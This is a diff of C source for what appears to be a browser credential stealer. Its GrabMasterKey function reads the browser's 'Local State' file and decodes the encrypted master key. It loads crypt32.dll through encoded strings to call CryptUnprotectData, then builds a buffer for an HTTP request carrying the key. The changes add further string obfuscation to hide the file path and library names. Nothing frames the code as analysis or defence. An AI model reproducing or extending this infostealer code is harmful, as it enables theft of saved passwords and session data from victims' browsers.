@@ -27,15 +27,16 @@ void GrabMasterKey(unsigned short *path) {
     unsigned char       Base64String[450]    = {0};
     unsigned char      *FileBuffer           = {0};
     unsigned char      *buffer               = {0};
+    unsigned short      LocalState[20]       = LOCAL_STATE;
     unsigned short     *TempPath[250]        = {0};
     int                 FullBufferSize       = 0;
     int                 FileSize             = 0;
-    int                 TotalBufferSize      = 0;
     int                 PathSize             = lenW(path);
     int                 i = 0, j = 0, k = 0;
 
+    DecodeStringW(LocalState);
     MovMemory(path, TempPath, PathSize * 2);
-    ConcatStringW(TempPath, L"\\Local State", PathSize);
+    ConcatStringW(TempPath, LocalState, PathSize);
 
     InitPathObj(TempPath, &PathObj, &PathUnicode);
     if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
@@ -86,11 +87,11 @@ void GrabMasterKey(unsigned short *path) {
     CryptedVaultKey.pbData = DecodedString;
 
     /*the passed argument is just crypt32.dll encoded*/
-    Crypt32Dll = LoadDll((unsigned short[12]){0x0068, 0x00d0, 0x008d, 0x00d5, 0x007f, 0x009c, 0x0068, 0x0032, 0x008e, 0x00a6, 0x009e, 0x0000});
+    Crypt32Dll = LoadDll(CRYPT32);
     if (Crypt32Dll == NULL) {
         return;
     }
-    pCryptUnprotectData = GetFuncAddress(Crypt32Dll, CRYPTOUNPROTECTDATA);
+    pCryptUnprotectData = GetFuncAddress(Crypt32Dll, CRYPTUNPROTECTDATA);
     if (pCryptUnprotectData == NULL) {
         return;
     }
@@ -99,9 +100,8 @@ void GrabMasterKey(unsigned short *path) {
         return;
     }
 
-    TotalBufferSize = TotalBufferLength(L"ZERO", 32);
-
-    buffer = AllocMemory((SIZE_T)TotalBufferSize);
+    /*423 is the size of the buffer we need to hold the http request and the key*/
+    buffer = AllocMemory((SIZE_T)423);
     if (buffer == NULL) {
         return;
     }
